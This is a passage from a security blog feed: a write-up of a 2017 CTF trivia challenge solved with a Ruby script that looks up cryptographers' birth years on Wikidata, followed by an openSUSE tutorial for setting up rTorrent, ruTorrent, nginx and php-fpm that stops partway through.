<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : Insomni’hack teaser 2017</li>
<li><strong>Website</strong> : <a href="http://teaser.insomnihack.ch/" target="_blank" rel="external">teaser.insomnihack.ch</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/382" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>cryptoquizz - Misc/Crypto - 50 pts - realized by cryptopathe</p>
<p>Hello, young hacker. Are you ready to fight rogue machines ? Now, you’ll have to prove us that you are a genuine cryptographer.</p>
<p>Running on quizz.teaser.insomnihack.ch:1031</p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><strong>Goal</strong>: In this challenge, a server a get us a name (of a famous cryptographer) and we have to find his/her birth year. Then we must send the year to the server and do it again for others cryptographers until we get the flag.</p>
<p>To find the year of someone famous it is possible to use the <a href="https://www.mediawiki.org/wiki/API" target="_blank" rel="external">Wikimedia API</a>. I tried the API <a href="https://en.wikipedia.org/wiki/Special:ApiSandbox" target="_blank" rel="external">sandbox</a> and figured that it was difficult to use it manually.</p>
<p>The wikimedia API works for all the Wikimedia Fundation entities, for example: Wikipedia, Wikidata,…</p>
<p>As we only want the birt year of the cryptographer we should prefer to use <a href="https://www.wikidata.org/" target="_blank" rel="external">Wikidata</a> instead of <a href="https://en.wikipedia.org/" target="_blank" rel="external">wikipedia</a>, there is less data to parse.</p>
<p>As I like ruby for scripting, I chose to use a ruby gem: a Wikidata API Client named <a href="https://rubygems.org/gems/wikidata-client/" target="_blank" rel="external"><strong>wikidata-client</strong></a>. Here is the <a href="http://www.rubydoc.info/gems/wikidata-client/" target="_blank" rel="external">documentation</a>.</p>
<p>Fist I only looked for the first person of the result. But I had soem wrong asnwer.<br>Because the server is giving wrong or partial name.<br>For example the server give <em>Ross Anderson</em> but there are:</p>
<ul>
<li><em>Ross Anderson</em> an alpine skier</li>
<li><em>Ross Anderson</em> a swimmer</li>
<li><em>Ross J. Anderson</em> a computer scientist, cryptographer</li>
</ul>
<p>Another example is the server also giving diminutive or nickname like <em>Ron Rivest</em> for <em>Ronald Rivest</em>. This is not a problem for Ronald but with <em>Jim Massey</em> this is. There is a cryptographer named <em>James Lee Massey</em> and his nickname <em>Jimmy Massey</em> and the diminutive of <em>Jimmy</em> is <em>Jim</em>. Problem is that the real <em>Jim Massey</em> is a comics writer and the server is giving a diminutive of a nickname of <em>James Lee Massey</em>…</p>
<p>So I had to create a <em>homonym avoidance</em> by checking the occupation of the person but this function takes too much time as it needs more requests and regex. So I finally disabled this function because it was making my requests timed out.<br>So I had to run my script several and have the luck not to search for ambiguous name and to finally get the flag.</p>
<p>Here is my ruby script:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'wikidata'</span></div><div class="line"></div><div class="line">hostname = <span class="string">'quizz.teaser.insomnihack.ch'</span></div><div class="line">port = <span class="number">1031</span></div><div class="line"></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line">raw = <span class="string">''</span></div><div class="line">flag = <span class="literal">false</span></div><div class="line">find = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/~~ What/</span>) &amp;&amp; flag == <span class="literal">false</span></div><div class="line">        name = raw.match(<span class="regexp">/^~~ What is the birth year of ([a-zA-Z\s\-\.]*) ?/</span>).captures[<span class="number">0</span>]</div><div class="line">        name = name[<span class="number">0</span>...-<span class="number">1</span>]</div><div class="line">        search = Wikidata::Item.search <span class="string">"<span class="subst">#&#123;name&#125;</span>"</span></div><div class="line">        <span class="keyword">if</span> search.empty? == <span class="literal">false</span></div><div class="line">            <span class="keyword">while</span> find == <span class="literal">false</span></div><div class="line">                man = search.results.first</div><div class="line">                <span class="comment">#occupation = man.properties('P106').to_s</span></div><div class="line">                <span class="comment">#if occupation.match(/crypto/) || occupation.match(/computer/)</span></div><div class="line">                <span class="keyword">if</span> <span class="literal">true</span> <span class="comment"># homonym avoidance take to much time</span></div><div class="line">                    birth_year = man.date_of_birth.date.year</div><div class="line">                    puts <span class="string">"<span class="subst">#&#123;name&#125;</span>: <span class="subst">#&#123;birth_year&#125;</span>"</span></div><div class="line">                    s.puts birth_year</div><div class="line">                    raw = <span class="string">''</span></div><div class="line">                    find = <span class="literal">true</span></div><div class="line">                <span class="keyword">else</span></div><div class="line">                    puts <span class="string">"shift"</span></div><div class="line">                    search.results.shift    <span class="comment"># remove first item of the array</span></div><div class="line">                <span class="keyword">end</span></div><div class="line">            <span class="keyword">end</span></div><div class="line">            find = <span class="literal">false</span>    <span class="comment"># for the next search</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure>
<p>Here is the output of the script:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/Insomnihack/Teaser/2017]</div><div class="line">$ ruby cryptoquizz.rb</div><div class="line"></div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line">~~ Hello, young hacker. Are you ready to fight rogue machines ?    ~~</div><div class="line">~~ Now, you&apos;ll have to prove us that you are a genuine             ~~</div><div class="line">~~ cryptographer.                                                  ~~</div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Nigel P. Smart ?</div><div class="line">Nigel P. Smart: 1967</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Don Coppersmith ?</div><div class="line">Don Coppersmith: 1950</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Niels Ferguson ?</div><div class="line">Niels Ferguson: 1965</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Mihir Bellare ?</div><div class="line">Mihir Bellare: 1962</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Amos Fiat ?</div><div class="line">Amos Fiat: 1956</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Wang Xiaoyun ?</div><div class="line">Wang Xiaoyun: 1966</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Eli Biham ?</div><div class="line">Eli Biham: 1960</div><div class="line"></div><div class="line"></div><div class="line">~~ What is the birth year of Martin Hellman ?</div><div class="line">Martin Hellman: 1945</div><div class="line"></div><div class="line"></div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div><div class="line">~~ OK, young hacker. You are now considered to be a                ~~</div><div class="line">~~ INS&#123;GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE&#125;     ~~</div><div class="line">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</div></pre></td></tr></table></figure>
<p>Flag was: <code>INS{GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE}</code>.</p>
<p><strong>Opinion</strong>: I don’t kniw if <em>cryptopathe</em> (challenge’s author) did it on purpose to make it harder or did it unintentionally because he/she didn’t checked his/her challenge and used a crappy data set, but giving wrong, partial, diminutive, nickname is very problematic for searches. I think this is not a well written challenge.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>OpenSUSE : Install rTorrent and ruTorrent</title>
    <link href="http://rawsec.ml/en/opensuse-install-rtorrent-rutorrent/"/>
    <id>http://rawsec.ml/en/opensuse-install-rtorrent-rutorrent/</id>
    <published>2016-12-29T23:00:00.000Z</published>
    <updated>2016-12-30T10:20:25.485Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>Install rTorrent, git ang nginx:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># zypper install rtorrent git nginx</div></pre></td></tr></table></figure>
<p><strong>Warning</strong>: rtorrent package in official openSUSE repository is not compiled with xmlrpc so you won’t be able to use it with rutorrent.</p>
<ul>
<li>Add the php devel repository to be able to install php7:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># zypper addrepo http://download.opensuse.org/repositories/devel:languages:php/openSUSE_Leap_42.1/devel:languages:php.repo</div><div class="line"># zypper refresh</div><div class="line"># zypper install php7 php7-fpm</div></pre></td></tr></table></figure>
<ul>
<li>Go to the default web folder and clone the <a href="https://github.com/Novik/ruTorrent" target="_blank" rel="external">ruTorrent</a> git repository:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd /srv/www/htdocs/</div><div class="line"># git clone https://github.com/Novik/ruTorrent.git rutorrent</div></pre></td></tr></table></figure>
<ul>
<li>Enable and start nginx:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable nginx.service</div><div class="line"># systemctl start nginx.service</div></pre></td></tr></table></figure>
<ul>
<li>Open php configuration:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/cli/php.ini</div></pre></td></tr></table></figure>
<ul>
<li>Disable php exposure (<a href="http://php.net/manual/en/ini.core.php#ini.expose-php" target="_blank" rel="external">expose_php</a>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">expose_php = Off</div></pre></td></tr></table></figure>
<ul>
<li>Enable file uploads (<a href="http://php.net/manual/en/ini.core.php#ini.file-uploads" target="_blank" rel="external">file_uploads</a>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_uploads = On</div></pre></td></tr></table></figure>
<ul>
<li>Set the maximum size of an uploaded file (<a href="http://php.net/manual/en/ini.core.php#ini.upload-max-filesize" target="_blank" rel="external">upload_max_filesize</a>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">upload_max_filesize = 15M</div></pre></td></tr></table></figure>
<ul>
<li>Set max size of post data allowed (<a href="http://php.net/manual/en/ini.core.php#ini.post-max-size" target="_blank" rel="external">post_max_size</a>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">post_max_size = 15M</div></pre></td></tr></table></figure>
<ul>
<li>Set the timezone (<a href="http://php.net/manual/en/datetime.configuration.php#ini.date.timezone" target="_blank" rel="external">date.timezone</a>).</li>
<li>For more security, limit the files that can be accessed by php (<a href="http://php.net/manual/en/ini.core.php#ini.open-basedir" target="_blank" rel="external">open_basedir</a>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open_basedir = /srv/www/htdocs/rutorrent</div></pre></td></tr></table></figure>
<ul>
<li>Change the value of cgi.fix_pathinfo to zero for security reasons:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgi.fix_pathinfo=0</div></pre></td></tr></table></figure>
<ul>
<li>Save and quit <code>php.ini</code>.</li>
<li>Create the <code>php-fpm.conf</code> and <code>www.conf</code> files:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># cp /etc/php7/fpm/php-fpm.conf.default /etc/php7/fpm/php-fpm.conf</div><div class="line"># cp /etc/php7/fpm/php-fpm.d/www.conf.default /etc/php7/fpm/php-fpm.d/www.conf</div></pre></td></tr></table></figure>
<ul>
<li>Edit the php-fpm configuration:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/fpm/php-fpm.conf</div></pre></td></tr></table></figure>
<ul>
<li>To enable php-fpm log, uncomment this line (the default prefix is <code>/var</code>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error_log = log/php-fpm.log</div></pre></td></tr></table></figure>
<ul>
<li>Edit the php-fpm pool file:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/php7/fpm/php-fpm.d/www.conf</div></pre></td></tr></table></figure>
<ul>
<li>Configure the owner of the nginx process to the Nginx user:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user = nginx</div><div class="line">group = nginx</div></pre></td></tr></table></figure>
<ul>
<li>Configure php-fpm to run under a socket file, not a port:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">listen = /var/run/php-fpm.sock</div></pre></td></tr></table></figure>
<ul>
<li>Change the permissions for the unix socket to the nginx user, group and mode:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">listen.owner = nginx</div><div class="line">listen.group = nginx</div><div class="line">listen.mode = 0660</div></pre></td></tr></table></figure>
<ul>
<li>Enable and start php-fpm:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># systemctl enable php-fpm</div><div class="line"># systemctl start php-fpm</div></pre></td></tr></table></figure>
<ul>
<li>Create an authentification folder for nginx:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/auth</div></pre></td></tr></table></figure>
<ul>
<li>Create the virtual servers directories:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/servers-available</div><div class="line"># mkdir /etc/nginx/servers-enabled</div></pre></td></tr></table></figure>
<ul>
<li>Edit the nginx configuration file:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/nginx.conf</div></pre></td></tr></table></figure>
<ul>
<li>And add this config:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">user nginx;</div><div class="line">worker_processes auto;</div><div class="line">pid /var/run/nginx.pid;</div><div class="line"></div><div class="line">events &#123;</div><div class="line">    worker_connections 1024;</div><div class="line">    multi_accept on;</div><div class="line">    use epoll;</div><div class="line">&#125;</div><div class="line"></div><div class="line">http &#123;</div><div class="line"></div><div class="line">    charset UTF-8;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Basic Settings</div><div class="line">    ##</div><div class="line">    server_names_hash_bucket_size 64;</div><div class="line">    sendfile on;</div><div class="line">    tcp_nopush on;</div><div class="line">    tcp_nodelay on;</div><div class="line">    keepalive_timeout 65;</div><div class="line">    types_hash_max_size 2048;</div><div class="line">    server_tokens off;</div><div class="line"></div><div class="line">    # server_name_in_redirect off;</div><div class="line"></div><div class="line">    include /etc/nginx/mime.types;</div><div class="line">    default_type application/octet-stream;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Logging Settings</div><div class="line">    ##</div><div class="line">    access_log /var/log/nginx/access.log;</div><div class="line">    error_log /var/log/nginx/error.log;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Gzip Settings</div><div class="line">    ##</div><div class="line">    gzip on;</div><div class="line">    gzip_disable &quot;msie6&quot;;</div><div class="line">    gzip_vary on;</div><div class="line">    gzip_proxied any;</div><div class="line">    gzip_comp_level 6;</div><div class="line">    gzip_buffers 16 8k;</div><div class="line">    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</div><div class="line"></div><div class="line">    ##</div><div class="line">    # Virtual Host Configs</div><div class="line">    ##</div><div class="line">    include /etc/nginx/servers-enabled/*;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>Save and quit.</li>
<li>Create the server domain config:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/servers-available/seedbox.conf</div></pre></td></tr></table></figure>
<ul>
<li>And add the config:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen 80;</div><div class="line">    listen [::]:80;</div><div class="line">    # Redirect all HTTP requests to HTTPS with a 301 Moved Permanently response.</div><div class="line">    return 301 https://$host$request_uri;</div><div class="line">&#125;</div><div class="line"></div><div class="line">##</div><div class="line"># BLOCK SERVEUR HTTPS</div><div class="line">##</div><div class="line">server &#123;</div><div class="line">    # http2 not supported by nginx 1.8.1</div><div class="line">    listen 443 ssl;</div><div class="line">    server_name seedbox.domain.example.org;</div><div class="line">    root /srv/www/htdocs/rutorrent;</div><div class="line">    index index.php index.html index.htm;</div><div class="line"></div><div class="line">##</div><div class="line"># SSL</div><div class="line">##</div><div class="line">    ssl_certificate /etc/nginx/ssl/seedbox.crt;</div><div class="line">    ssl_certificate_key /etc/nginx/ssl/seedbox.key;</div><div class="line"></div><div class="line">    ssl_protocols TLSv1.2;</div><div class="line">    ssl_ciphers EECDH+CHACHA20:EECDH+AESGCM:EECDH+AES;</div><div class="line">    ssl_ecdh_curve secp384r1;</div><div class="line">    ssl_prefer_server_ciphers on;</div><div class="line"></div><div class="line">    # ssl optimizations</div><div class="line">    ssl_session_timeout 5m;</div><div class="line">    ssl_session_cache shared:SSL:20m;</div><div class="line">    ssl_session_tickets on;</div><div class="line"></div><div class="line">##</div><div class="line"># SECURITY</div><div class="line">##</div><div class="line"></div><div class="line">    add_header X-XSS-Protection &quot;1; mode=block&quot;;</div><div class="line">    auth_basic &quot;Restricted Area&quot;;</div><div class="line">    auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth&quot;;</div><div class="line"></div><div class="line">##</div><div class="line"># PHP</div><div class="line">##</div><div class="line">    location / &#123;</div><div class="line">    index index.php index.html index.htm;</div><div class="line">    try_files $uri $uri/ /index.php?$args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ~ \.php$ &#123;</div><div class="line">    try_files $uri =404;</div><div class="line">    fastcgi_split_path_info ^(.+\.php)(/.+)$;</div><div class="line">    fastcgi_pass unix:/var/run/php-fpm.sock;</div><div class="line">    fastcgi_index index.php;</div><div class="line">    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</div><div class="line">    include fastcgi_params;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ^~ /conf/ &#123;</div><div class="line">    deny all;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    location ^~ /share/ &#123;</div><div class="line">    deny all;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>Don’t forget to change <code>server_name seedbox.domain.example.org;</code> with your own domain and create a CNAME entry in your DNS configuration.</li>
<li>Enable the server:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ln -s /etc/nginx/servers-available/seedbox.conf /etc/nginx/servers-enabled/seedbox.conf</div></pre></td></tr></table></figure>
<ul>
<li>To configure a self-signed certificate, add the certificate folder:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir /etc/nginx/ssl</div></pre></td></tr></table></figure>
<ul>
<li>Generate self-signed certificate:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cd /etc/nginx/ssl</div><div class="line"># openssl ecparam -genkey -name secp384r1 -out seedbox.key</div><div class="line"># openssl req -new -key seedbox.key -sha256 -out seedbox.csr</div><div class="line"># openssl req -x509 -days 3650 -sha256 -key seedbox.key -in seedbox.csr -out seedbox.crt</div></pre></td></tr></table></figure>
<ul>
<li>Modify files rights:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># chmod 644 /etc/nginx/ssl/*.crt</div><div class="line"># chmod 640 /etc/nginx/ssl/*.key</div></pre></td></tr></table></figure>
<ul>
<li>Create an user:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># useradd --shell /bin/bash --create-home sdbox</div><div class="line"># passwd sdbox</div></pre></td></tr></table></figure>
<ul>
<li>Create needed folder for rtorrent:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># mkdir -p /home/sdbox/&#123;torrents,watch,.session&#125;</div></pre></td></tr></table></figure>
<ul>
<li>Create rtorrent config file:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /home/sdbox/.rtorrent.rc</div></pre></td></tr></table></figure>
<ul>
<li>Paste the config:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">scgi_port = 127.0.0.1:5001</div><div class="line">encoding_list = UTF-8</div><div class="line">port_range = 45000-65000</div><div class="line">port_random = no</div><div class="line">check_hash = no</div><div class="line">directory = /home/sdbox/torrents</div><div class="line">session = /home/sdbox/.session</div><div class="line">encryption = allow_incoming, try_outgoing, enable_retry</div><div class="line">schedule = watch_directory,1,1,&quot;load_start=/home/sdbox/watch/*.torrent&quot;</div><div class="line">schedule = untied_directory,5,5,&quot;stop_untied=/home/sdbox/watch/*.torrent&quot;</div><div class="line">use_udp_trackers = yes</div><div class="line">dht = off</div><div class="line">peer_exchange = no</div><div class="line">min_peers = 40</div><div class="line">max_peers = 100</div><div class="line">min_peers_seed = 10</div><div class="line">max_peers_seed = 50</div><div class="line">max_uploads = 15</div><div class="line">execute = &#123;sh,-c,/usr/bin/php /srv/www/htdocs/rutorrent/php/initplugins.php sdbox &amp;&#125;</div><div class="line">schedule = espace_disque_insuffisant,1,30,close_low_diskspace=500M</div></pre></td></tr></table></figure>
<ul>
<li>Give user permissions:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># chown --recursive sdbox:users /home/sdbox</div><div class="line"># chown root:root /home/sdbox</div><div class="line"># chmod 755 /home/sdbox</div></pre></td></tr></table></figure>
<ul>
<li>Edit the virtual server config:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/nginx/servers-available/seedbox.conf</div></pre></td></tr></table></figure>
<ul>
<li>Add the config:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">location /SDBOX</div><div class="line">&#123;</div><div class="line">    include scgi_params;</div><div class="line">    scgi_pass 127.0.0.1:5001;</div><div class="line">    auth_basic &quot;Restricted Area&quot;;</div><div class="line">    auth_basic_user_file &quot;/etc/nginx/auth/seedbox_auth sdbox&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>In order to do not install apache-tools, manually generate the auth file for sdbox user (it will write over the file and don’t forget to change the password in the command):</li>
</ul>
